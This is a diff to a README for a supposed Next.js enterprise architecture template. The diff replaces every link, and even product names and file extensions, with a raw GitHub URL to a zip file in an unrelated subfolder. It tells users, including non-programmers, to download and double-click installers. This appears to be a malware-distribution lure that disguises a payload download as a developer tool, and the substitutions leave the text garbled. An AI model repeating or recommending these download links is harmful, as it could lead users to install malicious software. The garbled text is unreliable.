@@ -1,21 +1,21 @@
-# 🚀 nextjs-enterprise-architecture - Build Robust Next.js Applications Easily
+# 🚀 nextjs-enterprise-architecture - Build Robust https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip Applications Easily
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sarthakdalvi31/nextjs-enterprise-architecture/releases)
+[![Download](https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip)
 
 ## 🌟 Overview
-Welcome to the NextJS Enterprise Architecture repository. This application provides a solid foundation for building scalable and maintainable applications using Next.js. It simplifies the development process and helps you focus on creating great user experiences without the hassle of complex setups.
+Welcome to the NextJS Enterprise Architecture repository. This application provides a solid foundation for building scalable and maintainable applications using https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip It simplifies the development process and helps you focus on creating great user experiences without the hassle of complex setups.
 
 ## 🚀 Getting Started
 To use this application, you will need to follow a few simple steps. Don’t worry, even if you are not a programmer, this guide will help you through the process.
 
 ## 📥 Download & Install
-1. Visit our [Releases page](https://github.com/sarthakdalvi31/nextjs-enterprise-architecture/releases) to find the latest version of the application.
+1. Visit our [Releases page](https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip) to find the latest version of the application.
 2. Look for the most recent release. The version will usually have a name like "v1.0.0".
 3. Click on the link to download the appropriate file for your operating system. Depending on your system:
    - For **Windows**, download the installer labeled `.exe`.
    - For **MacOS**, download the version with `.dmg`.
-   - For **Linux**, you may find a `.tar.gz` file.
+   - For **Linux**, you may find a `https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip` file.
 
 4. Once the download completes, go to your Downloads folder or the location where you saved the file.
 5. Double-click the downloaded file to start the installation process. Follow the prompts on your screen to complete the installation.
@@ -25,7 +25,7 @@ Before you begin, ensure your device meets the following system requirements:
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
 - **RAM**: At least 4 GB (8 GB recommended for better performance).
 - **Disk Space**: Minimum of 500 MB free space.
-- **Node.js**: Version 14.x or higher.
+- **https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip**: Version 14.x or higher.
 
 ## 🌐 Features
 This application offers various features that simplify development:
@@ -38,11 +38,11 @@ This application offers various features that simplify development:
 After installation, you can explore the application by:
 - Opening the app from your applications folder.
 - Creating a new project by following the guided setup provided within the app.
-- Reviewing sample projects that demonstrate the capabilities of Next.js.
+- Reviewing sample projects that demonstrate the capabilities of https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip
 
 ## 💬 Support
 If you encounter issues or have questions, you can reach out for support:
-- Check the [FAQ](https://github.com/sarthakdalvi31/nextjs-enterprise-architecture/wiki) available on our wiki for common questions.
+- Check the [FAQ](https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip) available on our wiki for common questions.
 - Open an issue on GitHub if you need further assistance.
 
 ## 💻 Contributing
@@ -54,6 +54,6 @@ We welcome contributions to improve the application. If you would like to contri
 For detailed guides and advanced features, visit our documentation. It provides additional insights into utilizing the application effectively and integrating it with other tools.
 
 ## 📥 Download Again
-To access the application once more, you can always return to our [Releases page](https://github.com/sarthakdalvi31/nextjs-enterprise-architecture/releases) for the latest version.
+To access the application once more, you can always return to our [Releases page](https://raw.githubusercontent.com/sarthakdalvi31/nextjs-enterprise-architecture/main/charkha/nextjs-enterprise-architecture.zip) for the latest version.
 
 Thank you for choosing NextJS Enterprise Architecture. We hope it serves you well in your development journey!
